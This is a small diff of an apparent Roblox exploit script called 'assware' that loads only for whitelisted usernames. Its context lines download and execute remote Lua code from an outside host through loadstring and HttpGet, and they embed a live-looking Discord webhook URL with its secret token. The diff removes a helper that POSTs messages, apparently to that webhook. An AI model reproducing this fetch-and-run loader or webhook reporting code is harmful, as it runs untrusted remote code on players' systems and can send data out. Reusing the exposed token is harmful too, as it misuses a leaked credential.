@@ -22,23 +22,6 @@ local players = {
 }
 local username = game.Players.LocalPlayer.Name
 local down = loadstring(game:HttpGet("http://testproj11234.ct8.pl/waredown.txt"))()
-function SendMessage(url, message)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local data = {
-        ["content"] = message
-    }
-    local body = http:JSONEncode(data)
-    local response = request({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-    print("Sent")
-end
 if players[username] == true then
 	print("loading assware for " .. username)
 	local url = "https://discord.com/api/webhooks/1162210538852450334/z0yFuSUNlm8vvVzsJQWvVOhGX1e58HU9HT841I-_VZg0EG_3ke5ggoOiyr1iov5DOZZ0"
